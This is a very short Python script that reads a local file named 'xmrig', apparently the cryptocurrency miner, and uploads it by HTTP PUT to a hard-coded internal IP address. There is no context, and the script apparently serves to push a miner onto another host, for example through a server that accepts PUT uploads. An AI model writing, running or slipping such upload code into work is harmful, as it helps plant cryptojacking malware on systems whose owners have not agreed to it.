import requests

with open('./xmrig', 'r') as finput:
   response = requests.put('http://172.17.57.182/', data=finput)
   print(response)
